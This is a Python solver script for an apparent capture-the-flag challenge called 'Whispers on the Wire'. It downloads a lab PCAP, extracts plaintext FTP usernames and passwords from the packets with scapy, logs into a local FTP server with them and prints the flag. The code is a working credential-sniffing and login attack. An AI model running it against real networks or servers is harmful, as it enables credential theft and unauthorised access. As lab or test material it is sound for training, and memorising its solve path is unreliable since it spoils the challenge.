"""
CN-05 Solver - Whispers on the Wire (PCAP analysis + FTP)

Automates the intended solve path:
  1. Download the PCAP from cn05-capture
  2. Parse it to extract the plaintext FTP USER/PASS
  3. Log into cn05-target via FTP using the recovered credentials
  4. Download and print the Stage 5 flag

Usage:
    python3 cn05_solver.py --pcap-url http://localhost:8080/cn05-capture/evidence_capture.pcap --ftp-host localhost --ftp-port 2221
"""
import argparse
import re
import urllib.request
from ftplib import FTP
from scapy.all import rdpcap, Raw


def extract_creds_from_pcap(pcap_path: str):
    packets = rdpcap(pcap_path)
    username, password = None, None
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode(errors="ignore")
            user_match = re.search(r"USER (\S+)", payload)
            pass_match = re.search(r"PASS (\S+)", payload)
            if user_match:
                username = user_match.group(1)
            if pass_match:
                password = pass_match.group(1)
    return username, password


def main():
    parser = argparse.ArgumentParser(description="CN-05 PCAP + FTP solver")
    parser.add_argument("--pcap-url", default="http://localhost:8080/cn05-capture/evidence_capture.pcap")
    parser.add_argument("--ftp-host", default="localhost")
    parser.add_argument("--ftp-port", type=int, default=2221)
    args = parser.parse_args()

    local_pcap = "/tmp/evidence_capture.pcap"
    print(f"[*] Downloading PCAP from {args.pcap_url}")
    urllib.request.urlretrieve(args.pcap_url, local_pcap)

    print("[*] Extracting FTP credentials from PCAP...")
    username, password = extract_creds_from_pcap(local_pcap)
    if not username or not password:
        print("[-] Could not extract credentials from PCAP.")
        return
    print(f"[+] Recovered credentials: {username} / {password}")

    print(f"[*] Logging into FTP at {args.ftp_host}:{args.ftp_port}")
    ftp = FTP()
    ftp.connect(args.ftp_host, args.ftp_port, timeout=5)
    ftp.login(username, password)
    print("[+] FTP login successful.")

    lines = []
    ftp.retrlines("RETR flag.txt", lines.append)
    ftp.quit()

    content = "\n".join(lines)
    print("\n----- flag.txt -----")
    print(content)
    print("---------------------")

    flag_match = re.search(r"CipherNest\{[^}]+\}", content)
    if flag_match:
        print(f"\n[FLAG] {flag_match.group(0)}")


if __name__ == "__main__":
    main()
